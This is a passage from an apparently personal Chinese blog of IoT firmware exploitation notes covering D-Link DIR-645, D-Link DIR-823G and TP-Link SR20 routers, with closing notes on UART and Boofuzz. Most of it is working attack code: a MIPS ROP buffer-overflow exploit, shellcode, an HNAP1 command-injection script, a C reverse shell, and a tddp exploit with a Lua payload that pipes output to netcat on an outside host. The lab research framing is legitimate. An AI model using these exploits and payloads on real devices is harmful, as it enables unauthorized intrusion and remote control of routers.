class="built_in">hash</span> ok!</span><br><span class="line">[+] take time: 0.0024 s</span><br><span class="line">iot@attifyos ~/f/example1&gt; python pattern.py -c -l 20 -f _dir645_FW_103.bin.extracted/squashfs-root/var/run/password </span><br><span class="line">[*] Create pattern string contains 20 characters ok!</span><br><span class="line">[+] output to _dir645_FW_103.bin.extracted/squashfs-root/var/run/password ok!</span><br><span class="line">[+] take time: 0.0003 s</span><br></pre></td></tr></table></figure><p>先把widget程序跑起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static   -g 1234 ./usr/sbin/widget -a var/run/password</span><br></pre></td></tr></table></figure><p>漏洞点在读取<code>var/run/hash</code>文件内容时，没有检查size，造成栈溢出。</p><p><img alt="image-20200710145413268" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710145413268.png" class="lozad"></p><p><img alt="image-20200710145501082" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710145501082.png" class="lozad"></p><p><img alt="image-20200710153118887" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710153118887.png" class="lozad"></p><p>mian函数在结束的时候，会将栈中的函数返回地址赋给 <code>$ra</code>，并将使用过的变量赋给 <code>$s0-$s7</code> <code>$fp</code></p><p><img alt="image-20200710164728734" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710164728734.png" class="lozad"></p><p><code>$gp</code>用来存放一些用于系统维护的static和extern变量</p><p><img alt="image-20200710161557715" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710161557715.png" class="lozad"></p><p>在ida里面可以看到在REGINFO这个段内</p><p><img alt="image-20200710161443085" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710161443085.png" class="lozad"></p><p>可以看到ra寄存器已经被覆盖成 0x62626262</p><p><img alt="image-20200710155627574" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710155627574.png" class="lozad"></p><p>完整的利用ROP链如下</p><p><img alt="image-20200710162512524" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710162512524.png" class="lozad"></p><p>程序的劫持流程 <code>jr $a</code> -&gt; <code>jr 0x40854000+0x158c8</code> -&gt; <code>jalr 0x40854000+0x159cc</code> -&gt; <code>jalr system(cmd)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xi 0x40854000+0x158c8</span><br><span class="line">   0x408698c8:movet9,s5</span><br><span class="line">   0x408698cc:jalrt9</span><br><span class="line">   0x408698d0:addius0,s0,1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xi 0x40854000+0x159cc</span><br><span class="line">   0x408699cc:addius5,sp,16</span><br><span class="line">   0x408699d0:movea1,s3</span><br><span class="line">   0x408699d4:movea2,s1</span><br><span class="line">   0x408699d8:movet9,s0</span><br><span class="line">   0x408699dc:jalrt9</span><br><span class="line">   0x408699e0:movea0,s5</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xi 0x40854000+0x53200</span><br><span class="line">   0x408a7200 &lt;system&gt;:luigp,0x2</span><br><span class="line">   0x408a7204 &lt;system+4&gt;:addiugp,gp,13024</span><br><span class="line">   0x408a7208 &lt;system+8&gt;:addugp,gp,t9</span><br><span class="line">   0x408a720c &lt;system+12&gt;:addiusp,sp,-72</span><br><span class="line">   0x408a7210 &lt;system+16&gt;:swra,68(sp)</span><br><span class="line">   0x408a7214 &lt;system+20&gt;:sws5,64(sp)</span><br><span class="line">   0x408a7218 &lt;system+24&gt;:sws4,60(sp)</span><br><span class="line">   0x408a721c &lt;system+28&gt;:sws3,56(sp)</span><br><span class="line">   0x408a7220 &lt;system+32&gt;:sws2,52(sp)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc_address=<span class="number">0x40854000</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">payload+=p32(libc_address+<span class="number">0x53200</span><span class="number">-1</span>)<span class="comment"># $s0</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s1</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s2</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s3</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s4</span></span><br><span class="line">payload+=p32(libc_address+<span class="number">0x159cc</span>)  <span class="comment"># $s5 </span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s6</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s7</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $fp</span></span><br><span class="line">payload+=p32(libc_address+<span class="number">0x158c8</span>)  <span class="comment"># $ra</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload+=<span class="string">'sh\x00\x00'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"var/run/hash"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x/40xi 0x40854000+0x158c8</span></span><br><span class="line"><span class="string">   0x408698c8:  move    t9,s5</span></span><br><span class="line"><span class="string">   0x408698cc:  jalr    t9</span></span><br><span class="line"><span class="string">   0x408698d0:  addiu   s0,s0,1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x/40xi 0x40854000+0x159cc</span></span><br><span class="line"><span class="string">   0x408699cc:  addiu   s5,sp,16</span></span><br><span class="line"><span class="string">   0x408699d0:  move    a1,s3</span></span><br><span class="line"><span class="string">   0x408699d4:  move    a2,s1</span></span><br><span class="line"><span class="string">   0x408699d8:  move    t9,s0</span></span><br><span class="line"><span class="string">   0x408699dc:  jalr    t9</span></span><br><span class="line"><span class="string">   0x408699e0:  move    a0,s5</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="asm-py"><a href="#asm-py" class="headerlink" title="asm.py"></a>asm.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">li $v0,0x6e69622f</span></span><br><span class="line"><span class="string">sw $v0,0($sp)</span></span><br><span class="line"><span class="string">li $v0,0x0068732f</span></span><br><span class="line"><span class="string">sw $v0,4($sp)</span></span><br><span class="line"><span class="string">addiu $a0,$sp,0</span></span><br><span class="line"><span class="string">li $v0,4011</span></span><br><span class="line"><span class="string">li $a1,0</span></span><br><span class="line"><span class="string">li $a2,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(shellcode)):</span><br><span class="line">    payload+=<span class="string">'\\x'</span>+hex(ord(shellcode[i]))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><h3 id="start-py-1"><a href="#start-py-1" class="headerlink" title="start.py"></a>start.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">cmd = <span class="string">'# '</span></span><br><span class="line">current_path = os.getcwd()</span><br><span class="line">firware_path=<span class="string">'/home/iot/tools/firmware-analysis-toolkit/firmadyne/vulfirmware/example1/_dir645_FW_103.bin.extracted/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'login: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Password: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'ifconfig eth0 192.168.1.1'</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    r2=process('sh')</span></span><br><span class="line"><span class="string">    r2.sendline('cd '+firware_path)</span></span><br><span class="line"><span class="string">    r2.sendline('tar -cvf squashfs-root.tar squashfs-root/')</span></span><br><span class="line"><span class="string">    r2.sendline('python -m SimpleHTTPServer 8888')</span></span><br><span class="line"><span class="string">    sleep(2)</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'wget http://192.168.1.2:8888/squashfs-root.tar')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'tar -xvf squashfs-root.tar')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'mount -o bind /dev/ ./squashfs-root/dev/')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'mount -t proc /proc/ ./squashfs-root/proc/')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'chroot ./squashfs-root sh')</span></span><br><span class="line"><span class="string">    r2.close()</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    os.system(<span class="string">'sudo tunctl -t tap0 -u iot'</span>)</span><br><span class="line">    os.system(<span class="string">'sudo ifconfig tap0 192.168.1.2/24'</span>)</span><br><span class="line">    exploit(process(<span class="string">'./run.sh'</span>))</span><br></pre></td></tr></table></figure><h3 id="run-sh-1"><a href="#run-sh-1" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="string">'''startvm.sh</span></span><br><span class="line"><span class="string">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">cmd = <span class="string">'$ '</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'stty -echo'</span>)</span><br><span class="line">    os.system(<span class="string">'musl-gcc  -static -O2 exp.c -o exp'</span>)</span><br><span class="line">    os.system(<span class="string">'gzip -c exp &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'cat &lt;&lt;EOF &gt; exp.gz.b64'</span>) <span class="comment">#heredoc</span></span><br><span class="line">    r.sendline((read(<span class="string">'exp.gz'</span>)).encode(<span class="string">'base64'</span>))</span><br><span class="line">    r.sendline(<span class="string">'EOF'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'base64 -d exp.gz.b64 &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'gunzip exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chmod +x ./exp'</span>) </span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">exploit(process(<span class="string">'startvm.sh'</span>))</span><br></pre></td></tr></table></figure><h2 id="D-link-DIR-823G命令执行"><a href="#D-link-DIR-823G命令执行" class="headerlink" title="D-link DIR-823G命令执行"></a>D-link DIR-823G命令执行</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>goahead服务在 请求<code>/HNAP1/</code>页面时 post的数据没有进行过滤，造成了命令注入</p><p><img alt="image-20200714152205064" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714152205064.png" class="lozad"></p><p><img alt="image-20200714152223040" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714152223040.png" class="lozad"></p><p><img alt="" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714153442471.png" class="lozad"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">IP=<span class="string">'192.168.0.1'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#出入要执行的命令</span></span><br><span class="line">command = <span class="string">"'`ifconfig &gt; /web_mtn/hack_by_nocbtm.txt`'"</span></span><br><span class="line">length = len(command)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#构造报文的头部</span></span><br><span class="line">headers = requests.utils.default_headers()</span><br><span class="line">headers[<span class="string">"Content-Length"</span>]=str(length)</span><br><span class="line">headers[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"</span></span><br><span class="line">headers[<span class="string">"SOAPAction"</span>] = <span class="string">'"http://purenetworks.com/HNAP1/GetClientInfo"'</span></span><br><span class="line">headers[<span class="string">"Content-Type"</span>] = <span class="string">"text/xml; charset=UTF-8"</span></span><br><span class="line">headers[<span class="string">"Accept"</span>]=<span class="string">"*/*"</span></span><br><span class="line">headers[<span class="string">"Accept-Encoding"</span>]=<span class="string">"gzip, deflate"</span></span><br><span class="line">headers[<span class="string">"Accept-Language"</span>]=<span class="string">"zh-CN,zh;q=0.9,en;q=0.8"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#发送攻击payload</span></span><br><span class="line">payload = command</span><br><span class="line">r = requests.post(<span class="string">'http://'</span>+IP+<span class="string">'/HNAP1/'</span>, headers=headers, data=payload)</span><br></pre></td></tr></table></figure><p><img alt="image-20200714160840955" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714160840955.png" class="lozad"></p><h3 id="revershell-c"><a href="#revershell-c" class="headerlink" title="revershell.c"></a>revershell.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Simple reverse shell revershell.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">daemon(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">attacker_addr.sin_family = AF_INET;</span><br><span class="line">attacker_addr.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line">attacker_addr.sin_addr.s_addr = inet_addr(<span class="string">"192.168.1.2"</span>);</span><br><span class="line"><span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">1</span>);</span><br><span class="line">dup2(sock, <span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>, <span class="string">"/bin/sh"</span>, <span class="string">"-i"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img alt="image-20200714191623780" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714191623780.png" class="lozad"></p><h2 id="TP-Link-SR20-tddp命令执行"><a href="#TP-Link-SR20-tddp命令执行" class="headerlink" title="TP-Link SR20  tddp命令执行"></a>TP-Link SR20  tddp命令执行</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>tddp服务，在读取文件时，使用了<code>luaL_loadfile</code>加载文件，并且后面<code>lua_pcall</code>了文件里面的内容，没有做一些检查</p><p>文件里面写入 lua函数就可以调用执行。</p><p><img alt="image-20200715190223094" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715190223094.png" class="lozad"></p><p><img alt="image-20200715194713510" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715194713510.png" class="lozad"></p><p><img alt="image-20200715194632042" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715194632042.png" class="lozad"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Copyright 2019 Google LLC.</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Create a file in your tftp directory with the following contents:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#function config_test(config)</span></span><br><span class="line"><span class="comment">#  os.execute("telnetd -l /bin/login.sh")</span></span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Execute script as poc.py remoteaddr filename</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">port_send = <span class="number">1040</span></span><br><span class="line">port_receive = <span class="number">61000</span></span><br><span class="line"> </span><br><span class="line">tddp_ver = <span class="string">"01"</span></span><br><span class="line">tddp_command = <span class="string">"31"</span></span><br><span class="line">tddp_req = <span class="string">"01"</span></span><br><span class="line">tddp_reply = <span class="string">"00"</span></span><br><span class="line">tddp_padding = <span class="string">"%0.16X"</span> % <span class="number">00</span></span><br><span class="line"> </span><br><span class="line">tddp_packet = <span class="string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"> </span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind((<span class="string">''</span>, port_receive))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Send a request</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="string">"%s;arbitrary"</span> % sys.argv[<span class="number">2</span>]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[<span class="number">1</span>], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"> </span><br><span class="line">response, addr = sock_receive.recvfrom(<span class="number">1024</span>)</span><br><span class="line">r = response.encode(<span class="string">'hex'</span>)</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(config)</span></span></span><br><span class="line">  <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"id | nc 10.10.10.1 1337"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img alt="image-20200715165115729" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715165115729.png" class="lozad"></p><p>反弹shell</p><p><img alt="image-20200715185253238" data-src="F:\ubuntu_share\iot\分析模板\TP-Link SR20\利用成功截图证明和视频\image-20200715185253238.png" class="lozad"></p><h2 id="UART接口"><a href="#UART接口" class="headerlink" title="UART接口"></a>UART接口</h2><p><img alt="image-20200720142830325" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720142830325.png" class="lozad"></p><p><img alt="image-20200720142757253" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720142757253.png" class="lozad"></p><h3 id="接口调试工具"><a href="#接口调试工具" class="headerlink" title="接口调试工具"></a>接口调试工具</h3><p><img alt="image-20200720143039864" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720143039864.png" class="lozad"></p><h3 id="波特率"><a href="#波特率" class="headerlink" title="波特率"></a>波特率</h3><p><img alt="image-20200720143201264" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720143201264.png" class="lozad"></p><p><img alt="image-20200724141742030" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724141742030.png" class="lozad"></p><h2 id="BOOFUZZ流程"><a href="#BOOFUZZ流程" class="headerlink" title="BOOFUZZ流程"></a>BOOFUZZ流程</h2><p><img alt="image-20200721101153708" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200721101153708.png" class="lozad"></p><p><img alt="image-20200720161547905" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720161547905.png" class="lozad"></p><p>0x01 Boofuzz虚拟环境创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python3-pip python3-venv build-essential</span><br><span class="line">$ mkdir boofuzz &amp;&amp; cd boofuzz</span><br><span class="line">$ python3 -m venv env</span><br><span class="line">$ source env/bin/activate</span><br></pre></td></tr></table></figure><p>0x02 Boofuzz安装</p><figure 